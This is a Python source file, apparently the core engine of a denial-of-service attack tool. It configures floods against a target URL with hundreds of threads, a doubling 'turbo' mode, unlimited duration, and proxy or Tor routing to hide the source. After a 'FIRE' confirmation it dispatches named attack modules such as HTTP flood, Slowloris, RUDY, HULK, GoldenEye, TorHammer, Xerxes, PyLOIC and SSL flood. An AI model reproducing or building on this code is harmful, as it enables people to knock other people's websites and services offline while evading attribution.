import os
import sys
import time
import threading

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, "../.."))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from core.colors import *
from core.stats import Statistics
from core.monitor import SystemMonitor
from core.target_analyzer import TargetAnalyzer
from core.animations import Animation

class AttackEngine:
    def __init__(self, url, attack_type='http', threads=500, sockets=1000,
                 duration=0, proxy_file=None, use_tor=False, turbo=False):
        self.url = url
        self.attack_type = attack_type
        self.threads = threads * 2 if turbo else threads
        self.sockets = sockets * 2 if turbo else sockets
        self.duration = duration
        self.proxy_file = proxy_file
        self.use_tor = use_tor
        self.turbo = turbo
        
        self.stats = Statistics()
        self.monitor = SystemMonitor()
        self.running = False
    
    def _show_config(self):
        print(f"""
    {CYAN}╔══════════════════════════════════════════════════╗
    ║           ATTACK CONFIGURATION                   ║
    ╠══════════════════════════════════════════════════╣{RESET}
    {CYAN}║{RESET}  {YELLOW}🎯 Target      :{RESET} {WHITE}{self.url}{RESET}
    {CYAN}║{RESET}  {YELLOW}⚔️  Attack Type :{RESET} {RED}{self.attack_type.upper()}{RESET}
    {CYAN}║{RESET}  {YELLOW}🧵 Threads     :{RESET} {WHITE}{self.threads:,}{RESET}
    {CYAN}║{RESET}  {YELLOW}🔌 Sockets     :{RESET} {WHITE}{self.sockets:,}{RESET}
    {CYAN}║{RESET}  {YELLOW}⏱  Duration    :{RESET} {WHITE}{'∞ Infinite' if self.duration == 0 else str(self.duration) + 's'}{RESET}
    {CYAN}║{RESET}  {YELLOW}⚡ Turbo Mode  :{RESET} {GREEN if self.turbo else RED}{'ENABLED' if self.turbo else 'DISABLED'}{RESET}
    {CYAN}║{RESET}  {YELLOW}🌐 Proxy       :{RESET} {WHITE}{'Yes' if self.proxy_file else 'None'}{RESET}
    {CYAN}║{RESET}  {YELLOW}🧅 Tor Network :{RESET} {WHITE}{'Yes' if self.use_tor else 'No'}{RESET}
    {CYAN}╚══════════════════════════════════════════════════╝{RESET}
        """)
    
    def _live_stats_thread(self):
        """Show live stats"""
        while self.running:
            self.stats.print_live()
            time.sleep(0.5)
    
    def launch(self):
        # Show config
        self._show_config()
        
        # Verify target
        analyzer = TargetAnalyzer(self.url)
        if not analyzer.quick_check():
            print(f"  {error('Target verification failed!')}")
            return
        
        # Confirmation
        print(f"\n  {RED}⚠️  Type 'FIRE' to launch attack:{RESET} ", end='')
        confirm = input().strip()
        if confirm != 'FIRE':
            print(f"  {info('Attack cancelled')}")
            return
        
        # Import attack module
        attack_class = self._get_attack_class()
        if not attack_class:
            print(f"  {error(f'Attack type {self.attack_type} not found!')}")
            return
        
        # Initialize
        self.running = True
        self.stats.start()
        self.monitor.start()
        
        # Launch attack
        attacker = attack_class(
            url=self.url,
            threads=self.threads,
            sockets=self.sockets,
            duration=self.duration,
            proxy_file=self.proxy_file,
            stats=self.stats
        )
        
        # Start stats monitor
        threading.Thread(target=self._live_stats_thread, daemon=True).start()
        
        # Fire!
        try:
            attacker.attack()
        except KeyboardInterrupt:
            print(f"\n\n  {warning('Attack interrupted')}")
        
        # Stop
        self.running = False
        self.stats.stop()
        self.monitor.stop()
        
        # Final report
        print(f"\n\n  {success('Attack completed!')}")
        self.stats.print_final()
        self.monitor.print_stats()
    
    def _get_attack_class(self):
        """Dynamically load attack module"""
        try:
            if self.attack_type == 'http':
                from modules.attacks.http_flood import HTTPFlood
                return HTTPFlood
            elif self.attack_type == 'slowloris':
                from modules.attacks.slowloris import Slowloris
                return Slowloris
            elif self.attack_type == 'rudy':
                from modules.attacks.rudy import RUDY
                return RUDY
            elif self.attack_type == 'hulk':
                from modules.attacks.hulk import HULK
                return HULK
            elif self.attack_type == 'goldeneye':
                from modules.attacks.goldeneye import GoldenEye
                return GoldenEye
            elif self.attack_type == 'torhammer':
                from modules.attacks.tor_hammer import TorHammer
                return TorHammer
            elif self.attack_type == 'xerxes':
                from modules.attacks.xerxes import Xerxes
                return Xerxes
            elif self.attack_type == 'pyloic':
                from modules.attacks.pyloic import PyLOIC
                return PyLOIC
            elif self.attack_type == 'ssl':
                from modules.attacks.ssl_flood import SSLFlood
                return SSLFlood
            elif self.attack_type == 'multi':
                from modules.attacks.multi_vector import MultiVector
                return MultiVector
        except Exception as e:
            print(f"  {error(f'Module load error: {e}')}")
            return None
